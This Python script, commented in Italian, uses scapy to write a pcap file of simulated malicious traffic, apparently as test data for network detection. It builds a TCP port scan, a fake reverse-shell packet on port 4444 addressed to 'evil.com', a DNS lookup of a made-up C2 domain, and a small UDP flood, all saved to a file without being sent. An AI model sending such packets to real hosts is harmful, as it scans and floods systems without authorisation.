#!/usr/bin/env python3
"""
generate_malicious_pcap.py
Genera un file pcap con traffico di rete malevolo simulato.
"""

from scapy.all import  wrpcap, Raw
from scapy.layers.inet import IP, TCP, UDP
from scapy.layers.dns import DNS, DNSQR
from scapy.layers.l2 import Ether

packets = []

# 🎯 IP sorgente malevolo
SRC_IP = "192.168.1.100"
DST_IP = "10.0.0.50"

# 1. 🔍 Port scan TCP SYN su porte 22, 80, 443, 4444
for port in [22, 80, 443, 4444]:
    pkt = Ether() / IP(src=SRC_IP, dst=DST_IP) / TCP(dport=port, flags="S")
    packets.append(pkt)

# 2. 🖥️ Connessione stabilita su porta 4444 (simula reverse shell)
pkt = Ether() / IP(src=SRC_IP, dst=DST_IP) / TCP(sport=55555, dport=4444, flags="PA") / Raw(load=b"GET /shell HTTP/1.1\r\nHost: evil.com\r\n\r\n")
packets.append(pkt)

# 3. 🌐 Richiesta DNS a dominio sospetto
dns_query = Ether() / IP(src=SRC_IP, dst="8.8.8.8") / UDP(sport=12345, dport=53) / DNS(rd=1, qd=DNSQR(qname="malware.c2.server.local"))
packets.append(dns_query)

# 4. 💥 Traffico UDP flood verso porta 53 (simula DoS)
for i in range(20):
    pkt = Ether() / IP(src=SRC_IP, dst=DST_IP) / UDP(sport=1024+i, dport=53) / Raw(load=b"malicious payload")
    packets.append(pkt)

# 📥 Salva su file
wrpcap("malicious_traffic.pcap", packets)
print("✅ File 'malicious_traffic.pcap' generato con traffico malevolo simulato.")